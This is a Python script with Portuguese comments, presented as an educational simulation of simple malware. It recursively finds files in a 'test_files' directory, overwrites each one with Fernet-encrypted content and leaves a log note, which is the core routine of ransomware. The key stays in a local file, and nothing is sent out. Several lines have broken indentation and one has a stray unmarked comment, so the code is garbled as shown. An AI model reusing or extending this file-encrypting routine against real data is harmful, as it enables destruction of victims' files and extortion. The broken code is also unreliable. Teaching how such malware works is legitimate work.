# Simulando um Malware de Captura de Dados Simples em Python e Aprendendo a se Proteger
from cryptography.fernet import Fernet
import os

# Funções de Criptografia 

def gerar_chave():
    
    #1. Gera uma chave de criptografia Fernet e a salva em um arquivo. A chave Fernet é simétrica (a mesma chave criptografa e descriptografa). É essencial armazená-la de forma segura.
    
    chave = Fernet.generate_key()
      with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
        
def carregar_chave():    #2. Carrega a chave salva do arquivo 'chave.key' para ser usada pela Fernet.
   return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo_path, chave): #3. Criptografa o conteúdo de um único arquivo usando a chave fornecida e sobrescreve o arquivo original com os dados criptografados.
    f = Fernet(chave)  # Inicializa o objeto Fernet com a chave
        
    with open(arquivo_path, "rb") as file: # Lê o conteúdo original do arquivo em modo binário
        dados = file.read()
        
        dados_encriptados = f.encrypt(dados) # Criptografa os dados
    
        with open(arquivo_path, "wb") as file: # Sobrescreve o arquivo original com os dados criptografados (modo 'wb')
        file.write(dados_encriptados)

# --- Funções de Navegação de Arquivos ---

def encontrar_arquivos(diretorio):  #4. Percorre o diretório e subdiretórios para encontrar caminhos de arquivos válidos. Exclui arquivos de chave (.key) e o próprio script para evitar erros.
   lista = []
      for raiz, _, arquivos in os.walk(diretorio):
      for nome in arquivos:
            caminho = os.path.join(raiz, nome)   
      # os.walk percorre a 'raiz', 'subdiretórios' (não usados), e 'arquivos'
            
            if nome != "encrypt_files.py" and not nome.endswith(".key"):   # Condição para ignorar o script e a chave
                lista.append(caminho)
    return lista

# --- Mensagem (Exemplo) ---

def criar_mensagem_exemplo():  #5. Cria uma mensagem de exemplo (instruções/log) no diretório de execução. # 'w' = write (escrever/sobrescrever)
    with open("LOG.txt", "w") as f:
        f.write("Arquivos criptografados com sucesso para demonstração.\n")
        f.write("A chave para descriptografia foi salva em 'chave.key'.\n")
        f.write("Diretório base: test_files\n")


# --- Execução Principal (Criptografia) ---

def main_cripto():  6. Execução principal: Gera a chave, carrega, encontra arquivos e os criptografa.
    gerar_chave()  # Garante que a chave existe
    
    # Carrega a chave
    chave = carregar_chave() # Correção: Agora chama a função ()
    
    # Encontra os arquivos no diretório 'test_files'
    arquivos = encontrar_arquivos("test_files") # Correção: Diretório corrigido
    
    # Loop para criptografar cada arquivo encontrado
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave) # Correção: Nome da função corrigido

    criar_mensagem_exemplo()
    print("Execução de Criptografia Concluída. Arquivos criptografados.")

if __name__ == "__main__":
    main_cripto()
